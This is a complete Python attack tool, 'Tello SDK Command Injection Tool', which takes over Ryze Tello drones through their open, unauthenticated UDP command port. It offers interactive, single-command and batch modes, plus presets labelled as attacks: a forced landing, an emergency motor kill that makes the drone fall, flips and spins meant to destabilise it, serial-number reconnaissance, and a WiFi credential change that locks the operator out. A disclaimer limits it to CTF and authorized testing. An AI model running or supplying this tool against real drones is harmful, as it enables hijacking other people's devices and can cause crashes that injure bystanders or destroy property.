#!/usr/bin/env python3
"""
Tello SDK Command Injection Tool

Exploits the Ryze Tello's completely unauthenticated UDP command interface.
The Tello creates an open WiFi AP (TELLO-XXXXXX) and accepts SDK commands
on UDP port 8889 from ANY connected client — no pairing, no auth, no
encryption. Whoever sends a command last wins.

Attack scenario:
  1. Connect to the Tello's WiFi AP (open, no password)
  2. Send 'command' to enter SDK mode
  3. Send any control command — the Tello obeys immediately

This also works if the legitimate controller app is connected: the Tello
processes commands from all UDP sources on port 8889 simultaneously.

Usage:
    # Interactive mode (default, safe — just connects)
    python3 tello-takeover.py

    # Send a single command
    python3 tello-takeover.py --cmd land

    # Emergency stop (immediate motor shutoff)
    python3 tello-takeover.py --cmd emergency

    # Custom Tello IP (default: 192.168.10.1)
    python3 tello-takeover.py --ip 192.168.10.1

    # Batch mode from file
    python3 tello-takeover.py --script commands.txt

Dependencies: None (stdlib only)

For CTF research and authorized security testing only.
"""

import argparse
import socket
import sys
import time

# Default Tello endpoint
TELLO_IP = "192.168.10.1"
TELLO_CMD_PORT = 8889
TELLO_STATE_PORT = 8890
TELLO_VIDEO_PORT = 11111

# Local bind
LOCAL_IP = ""
LOCAL_CMD_PORT = 9000


# Commands organized by category
SDK_COMMANDS = {
    "Control": {
        "command":    "Enter SDK mode (required first)",
        "takeoff":    "Auto takeoff to ~1m",
        "land":       "Auto land",
        "emergency":  "EMERGENCY — immediate motor stop (drone falls)",
        "stop":       "Hover in place (stop movement)",
    },
    "Movement": {
        "up X":       "Ascend X cm (20-500)",
        "down X":     "Descend X cm (20-500)",
        "left X":     "Fly left X cm (20-500)",
        "right X":    "Fly right X cm (20-500)",
        "forward X":  "Fly forward X cm (20-500)",
        "back X":     "Fly back X cm (20-500)",
        "cw X":       "Rotate clockwise X degrees (1-360)",
        "ccw X":      "Rotate counter-clockwise X degrees (1-360)",
        "flip X":     "Flip in direction (l/r/f/b) — destabilizes",
    },
    "Speed": {
        "speed X":    "Set speed X cm/s (10-100)",
    },
    "Status": {
        "speed?":     "Query current speed",
        "battery?":   "Query battery percentage",
        "time?":      "Query flight time",
        "height?":    "Query height",
        "temp?":      "Query temperature",
        "attitude?":  "Query IMU attitude",
        "baro?":      "Query barometer",
        "tof?":       "Query ToF sensor",
        "wifi?":      "Query WiFi SNR",
        "sdk?":       "Query SDK version",
        "sn?":        "Query serial number",
    },
    "WiFi": {
        "wifi SSID PASS": "Change WiFi SSID and password (locks out operator!)",
    },
    "Advanced": {
        "rc A B C D":     "Virtual RC: roll(-100~100) pitch throttle yaw",
        "go X Y Z SPD":   "Fly to (X,Y,Z) at speed",
        "curve X1 Y1 Z1 X2 Y2 Z2 SPD": "Fly curve",
    },
}

# Attack-relevant quick commands
ATTACK_PRESETS = {
    "1": ("Land the drone", "land"),
    "2": ("Emergency stop (motor kill)", "emergency"),
    "3": ("Fly up 200cm then land", ["up 200", "land"]),
    "4": ("Spin 360° (disorient)", "cw 360"),
    "5": ("Flip forward (destabilize)", "flip f"),
    "6": ("Lock out operator (change WiFi)", None),  # Special handling
    "7": ("Read battery + serial (recon)", ["battery?", "sn?", "sdk?"]),
}


class TelloController:
    """UDP command interface to a Tello drone."""

    def __init__(self, tello_ip=TELLO_IP, local_port=LOCAL_CMD_PORT):
        self.tello_addr = (tello_ip, TELLO_CMD_PORT)
        self.local_port = local_port
        self.sock = None
        self.connected = False
        self.response_timeout = 7  # Tello can be slow to respond

    def connect(self):
        """Create UDP socket and enter SDK mode."""
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.bind((LOCAL_IP, self.local_port))
        self.sock.settimeout(self.response_timeout)

        print(f"[*] Sending 'command' to {self.tello_addr[0]}:{self.tello_addr[1]}...", file=sys.stderr)
        response = self.send_command("command")

        if response and "ok" in response.lower():
            print("[+] SDK mode activated. Tello is under our control.", file=sys.stderr)
            self.connected = True
            return True
        elif response:
            print(f"[?] Unexpected response: {response}", file=sys.stderr)
            self.connected = True  # Try anyway
            return True
        else:
            print("[!] No response from Tello. Ensure you're connected to TELLO-XXXXXX WiFi.", file=sys.stderr)
            return False

    def send_command(self, cmd):
        """Send a command and wait for response."""
        print(f"  [TX] {cmd}", file=sys.stderr)
        try:
            self.sock.sendto(cmd.encode('utf-8'), self.tello_addr)
        except OSError as e:
            print(f"  [!] Send error: {e}", file=sys.stderr)
            return None

        try:
            data, addr = self.sock.recvfrom(1024)
            response = data.decode('utf-8', errors='replace').strip()
            print(f"  [RX] {response}", file=sys.stderr)
            return response
        except TimeoutError:
            print("  [RX] (timeout — no response)", file=sys.stderr)
            return None

    def run_interactive(self):
        """Interactive command loop."""
        print(f"\n{'=' * 60}", file=sys.stderr)
        print("  Tello Takeover — Interactive Mode", file=sys.stderr)
        print(f"  Target: {self.tello_addr[0]}:{self.tello_addr[1]}", file=sys.stderr)
        print(f"{'=' * 60}", file=sys.stderr)

        print("\n  Quick attacks:", file=sys.stderr)
        for key, (desc, _) in ATTACK_PRESETS.items():
            print(f"    {key}. {desc}", file=sys.stderr)

        print("\n  Or type any SDK command directly.", file=sys.stderr)
        print("  Type 'help' for all commands, 'quit' to exit.", file=sys.stderr)
        print("", file=sys.stderr)

        while True:
            try:
                cmd = input("  tello> ").strip()
            except (EOFError, KeyboardInterrupt):
                print("\n[*] Exiting.", file=sys.stderr)
                break

            if not cmd:
                continue

            if cmd.lower() in ('quit', 'exit'):
                break

            if cmd.lower() == 'help':
                self._print_help()
                continue

            # Check for preset shortcuts
            if cmd in ATTACK_PRESETS:
                desc, preset_cmd = ATTACK_PRESETS[cmd]
                print(f"  [{desc}]", file=sys.stderr)

                if cmd == "6":
                    # WiFi lockout — needs confirmation
                    print("  This changes the Tello's WiFi SSID and password.", file=sys.stderr)
                    print("  The legitimate operator will lose connection.", file=sys.stderr)
                    try:
                        confirm = input("  New SSID (or 'cancel'): ").strip()
                    except (EOFError, KeyboardInterrupt):
                        continue
                    if confirm.lower() == 'cancel' or not confirm:
                        continue
                    try:
                        password = input("  New password (8+ chars): ").strip()
                    except (EOFError, KeyboardInterrupt):
                        continue
                    if len(password) < 8:
                        print("  [!] Password must be 8+ characters.", file=sys.stderr)
                        continue
                    self.send_command(f"wifi {confirm} {password}")
                    continue

                if isinstance(preset_cmd, list):
                    for c in preset_cmd:
                        self.send_command(c)
                        time.sleep(0.5)
                else:
                    self.send_command(preset_cmd)
                continue

            # Direct command
            self.send_command(cmd)

    def run_script(self, script_path):
        """Execute commands from a file, one per line."""
        try:
            with open(script_path) as f:
                lines = [l.strip() for l in f if l.strip() and not l.startswith('#')]
        except FileNotFoundError:
            print(f"[!] Script file not found: {script_path}", file=sys.stderr)
            return

        print(f"[*] Running script: {script_path} ({len(lines)} commands)", file=sys.stderr)
        for i, cmd in enumerate(lines, 1):
            print(f"  [{i}/{len(lines)}]", file=sys.stderr)
            self.send_command(cmd)
            time.sleep(1)  # Tello needs time between commands

    def _print_help(self):
        """Print all available commands."""
        print("\n  Tello SDK Commands:", file=sys.stderr)
        for category, cmds in SDK_COMMANDS.items():
            print(f"\n  [{category}]", file=sys.stderr)
            for cmd, desc in cmds.items():
                print(f"    {cmd:30s}  {desc}", file=sys.stderr)
        print("", file=sys.stderr)

    def close(self):
        """Clean up."""
        if self.sock:
            # Try to land before disconnecting (safety)
            # self.send_command("land")
            self.sock.close()


def main():
    parser = argparse.ArgumentParser(
        description="Tello SDK Command Injection — exploit unauthenticated UDP interface",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
The Tello accepts commands from ANY client on its WiFi network.
No authentication, no encryption, no pairing required.

Examples:
  %(prog)s                          Interactive mode
  %(prog)s --cmd land               Single command: land
  %(prog)s --cmd emergency          Single command: emergency motor stop
  %(prog)s --cmd "battery?"         Query battery
  %(prog)s --script commands.txt    Run commands from file

Connect to the Tello's WiFi AP (TELLO-XXXXXX) before running.
        """
    )
    parser.add_argument("--ip", default=TELLO_IP,
                        help=f"Tello IP address (default: {TELLO_IP})")
    parser.add_argument("--port", type=int, default=LOCAL_CMD_PORT,
                        help=f"Local UDP port to bind (default: {LOCAL_CMD_PORT})")
    parser.add_argument("--cmd", metavar="COMMAND",
                        help="Single SDK command to send")
    parser.add_argument("--script", metavar="FILE",
                        help="Execute commands from a file (one per line)")
    parser.add_argument("--no-sdk-init", action="store_true",
                        help="Skip 'command' initialization (already in SDK mode)")

    args = parser.parse_args()

    tello = TelloController(tello_ip=args.ip, local_port=args.port)

    try:
        if args.no_sdk_init:
            tello.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            tello.sock.bind((LOCAL_IP, args.port))
            tello.sock.settimeout(tello.response_timeout)
            tello.connected = True
        else:
            if not tello.connect():
                sys.exit(1)

        if args.cmd:
            tello.send_command(args.cmd)
        elif args.script:
            tello.run_script(args.script)
        else:
            tello.run_interactive()
    finally:
        tello.close()


if __name__ == "__main__":
    main()
